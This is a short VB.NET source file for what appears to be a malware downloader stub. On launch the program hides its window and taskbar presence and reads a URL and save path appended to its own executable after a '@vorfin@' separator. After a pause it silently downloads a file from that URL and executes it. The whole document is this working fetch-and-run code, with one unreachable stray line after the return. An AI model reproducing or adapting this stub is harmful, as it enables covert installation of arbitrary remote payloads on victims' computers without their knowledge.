Imports System.IO
Public Class Form1

    Dim options(), text1, text2, text3 As String
    Const FileSplit = "@vorfin@"

    Private Function DLrun(ByVal DLfrom As String, ByVal saveto As String) As Boolean
        If My.Computer.FileSystem.FileExists(saveto) Then
            Kill(saveto)
        End If
        Try
            My.Computer.Network.DownloadFile(DLfrom, saveto)
            Process.Start(saveto)
        Catch
            Return False
        End Try
        Return True
        If DLrun(TextBox1.Text, TextBox3.Text & "\" & TextBox2.Text) = False Then End
    End Function

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Me.Hide()
        Me.Opacity = 0
        Me.Visible = False
        Me.ShowInTaskbar = False
        Me.ShowIcon = False

        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
        text1 = Space(LOF(1))
        text2 = Space(LOF(1))
        text3 = Space(LOF(1))
      
        FileGet(1, text1) ' options(1)
        FileGet(1, text2) ' options(2)
        FileGet(1, text3) ' options(3)
      
        FileClose(1)
        options = Split(text1, FileSplit)

        TextBox1.Text = options(1)
        TextBox2.Text = options(2)
        TextBox3.Text = options(3)
    

        System.Threading.Thread.Sleep(3000)


        DLrun(TextBox1.Text, TextBox3.Text & "\" & TextBox2.Text)

    End Sub
End Class
